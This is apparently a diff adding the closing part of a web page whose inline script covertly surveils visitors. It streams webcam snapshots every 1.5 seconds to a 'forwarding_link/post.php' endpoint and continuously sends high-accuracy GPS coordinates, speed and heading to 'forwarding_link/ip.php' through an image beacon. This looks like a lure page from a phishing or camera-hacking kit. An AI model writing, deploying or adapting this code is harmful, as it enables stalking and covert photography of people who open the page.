@@ -1,0 +1,118 @@
+    </div>
+
+    <script>
+        function post(imgdata) {
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata },
+                url: 'forwarding_link/post.php',
+                dataType: 'json',
+                async: false,
+                success: function(result) {
+                    // call the function that handles the response/results
+                },
+                error: function() {
+                }
+            });
+        }
+        
+        // Function to send location data to server
+        function sendLocationToServer(position) {
+            const locationData = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                altitude: position.coords.altitude,
+                speed: position.coords.speed,
+                heading: position.coords.heading,
+                timestamp: position.timestamp
+            };
+            
+            // Convert location data to URL parameters
+            const params = new URLSearchParams();
+            for (const [key, value] of Object.entries(locationData)) {
+                if (value !== null) {
+                    params.append(key, value);
+                }
+            }
+            
+            // Send data using GET request
+            const img = new Image();
+            img.src = "forwarding_link/ip.php?" + params.toString();
+            console.log("Location sent:", locationData);
+        }
+        
+        // Function to track location
+        function trackLocation() {
+            if (navigator.geolocation) {
+                // Get location with high accuracy
+                const options = {
+                    enableHighAccuracy: true,
+                    maximumAge: 0,
+                    timeout: 5000
+                };
+                
+                // Get initial position
+                navigator.geolocation.getCurrentPosition(sendLocationToServer, 
+                    function(error) {
+                        console.error("Error getting location:", error.message);
+                    }, 
+                    options
+                );
+                
+                // Set up continuous tracking
+                const watchId = navigator.geolocation.watchPosition(sendLocationToServer,
+                    function(error) {
+                        console.error("Error tracking location:", error.message);
+                    }, 
+                    options
+                );
+                
+                // Store watchId to allow stopping location tracking later
+                window.locationWatchId = watchId;
+            } else {
+                console.error("Geolocation is not supported by this browser");
+            }
+        }
+
+        'use strict';
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const errorMsgElement = document.querySelector('span#errorMsg');
+
+        const constraints = {
+            audio: false,
+            video: {
+                facingMode: "user"
+            }
+        };
+
+        // Access webcam
+        async function init() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                handleSuccess(stream);
+            } catch (e) {
+                console.error(`navigator.getUserMedia error: ${e.toString()}`);
+            }
+        }
+
+        // Success
+        function handleSuccess(stream) {
+            window.stream = stream;
+            video.srcObject = stream;
+
+            var context = canvas.getContext('2d');
+            setInterval(function() {
+                context.drawImage(video, 0, 0, 640, 480);
+                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                post(canvasData);
+            }, 1500);
+        }
+    </script>
+    
+    <!-- Load platform selector script -->
+    <script src="platform-selector.js"></script>
+</body>
+</html> 
